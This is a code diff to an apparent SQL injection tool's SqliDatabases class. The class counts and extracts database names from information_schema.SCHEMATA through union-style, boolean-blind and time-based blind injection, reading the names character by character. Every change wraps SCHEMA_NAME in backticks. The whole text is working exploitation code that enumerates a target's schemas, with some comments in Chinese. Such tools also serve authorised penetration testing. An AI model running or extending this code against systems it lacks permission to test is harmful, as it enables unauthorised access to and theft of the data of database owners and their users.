@@ -28,7 +28,7 @@ class SqliDatabases(SqliTest):
             logger.debug("Start database amount sqli...")
             # 先注databases的数量
 
-            databases_number = normal_injection(select='COUNT(SCHEMA_NAME)',
+            databases_number = normal_injection(select='COUNT(`SCHEMA_NAME`)',
                                                 source='information_schema.SCHEMATA',
                                                 dealpayload=self.dealpayload,
                                                 data=self.Data, isCount=True, sqlirequest=self.sqlirequest
@@ -42,7 +42,7 @@ class SqliDatabases(SqliTest):
                 # 首先是database name的长度
                 logger.debug("Start %dth database length sqli..." % (i + 1))
 
-                databases_name_len = normal_injection(select='length(SCHEMA_NAME)',
+                databases_name_len = normal_injection(select='length(`SCHEMA_NAME`)',
                                                       source='information_schema.SCHEMATA',
                                                       limit=i,
                                                       dealpayload=self.dealpayload,
@@ -55,7 +55,7 @@ class SqliDatabases(SqliTest):
                 # 然后注database name
                 logger.debug("Start %dth database name sqli..." % (i + 1))
 
-                databases_name = normal_injection(select='SCHEMA_NAME',
+                databases_name = normal_injection(select='`SCHEMA_NAME`',
                                                   source='information_schema.SCHEMATA', limit=i,
                                                   dealpayload=self.dealpayload,
                                                   data=self.Data, isStrings=True, sqlirequest=self.sqlirequest
@@ -74,7 +74,7 @@ class SqliDatabases(SqliTest):
             logger.debug("The sqlimethod is %s..." % self.sqlimethod)
             logger.debug("Start database amount sqli...")
 
-            retVal = build_injection(select="COUNT(SCHEMA_NAME)",
+            retVal = build_injection(select="COUNT(`SCHEMA_NAME`)",
                                      source="information_schema.SCHEMATA",
                                      dealpayload=self.dealpayload, data=self.Data, lens=self.len,
                                      isCount=True, sqlirequest=self.sqlirequest)
@@ -88,7 +88,7 @@ class SqliDatabases(SqliTest):
                 logger.debug("Start %dth database length sqli..." % (i + 1))
                 # 然后注databases_name 的 length
 
-                retVal = build_injection(select="length(SCHEMA_NAME)",
+                retVal = build_injection(select="length(`SCHEMA_NAME`)",
                                          source="information_schema.SCHEMATA",
                                          limit=i,
                                          dealpayload=self.dealpayload, data=self.Data, lens=self.len,
@@ -104,7 +104,7 @@ class SqliDatabases(SqliTest):
                 logger.debug("Start %dth database sqli..." % (i + 1))
                 for j in trange(int(databases_name_len), desc='%dth Database sqli' % (i + 1), leave=False):
 
-                    retVal = build_injection(select="ascii(substring(SCHEMA_NAME," + repr(j + 1) + ",1))",
+                    retVal = build_injection(select="ascii(substring(`SCHEMA_NAME`," + repr(j + 1) + ",1))",
                                              source="information_schema.SCHEMATA",
                                              limit=i,
                                              dealpayload=self.dealpayload, data=self.Data, lens=self.len,
@@ -125,7 +125,7 @@ class SqliDatabases(SqliTest):
             logger.debug("The sqlimethod is %s..." % self.sqlimethod)
             logger.debug("Start database amount sqli...")
 
-            retVal = time_injection(select="COUNT(SCHEMA_NAME)",
+            retVal = time_injection(select="COUNT(`SCHEMA_NAME`)",
                                     source="information_schema.SCHEMATA",
                                     dealpayload=self.dealpayload, data=self.Data, times=self.time,
                                     isCount=True, sqlirequest=self.sqlirequest)
@@ -139,7 +139,7 @@ class SqliDatabases(SqliTest):
 
                 # 然后注databases_name 的 length
 
-                retVal = time_injection(select="length(SCHEMA_NAME)",
+                retVal = time_injection(select="length(`SCHEMA_NAME`)",
                                         source="information_schema.SCHEMATA",
                                         limit=i,
                                         dealpayload=self.dealpayload, data=self.Data, times=self.time,
@@ -155,7 +155,7 @@ class SqliDatabases(SqliTest):
                 logger.debug("Start %dth database sqli..." % (i + 1))
 
                 for j in trange(int(databases_name_len), desc='%dth Database sqli' % (i + 1), leave=False):
-                    retVal = time_injection(select="ascii(substring(SCHEMA_NAME," + repr(j + 1) + ",1))",
+                    retVal = time_injection(select="ascii(substring(`SCHEMA_NAME`," + repr(j + 1) + ",1))",
                                             source="information_schema.SCHEMATA",
                                             limit=i,
                                             dealpayload=self.dealpayload, data=self.Data, times=self.time,
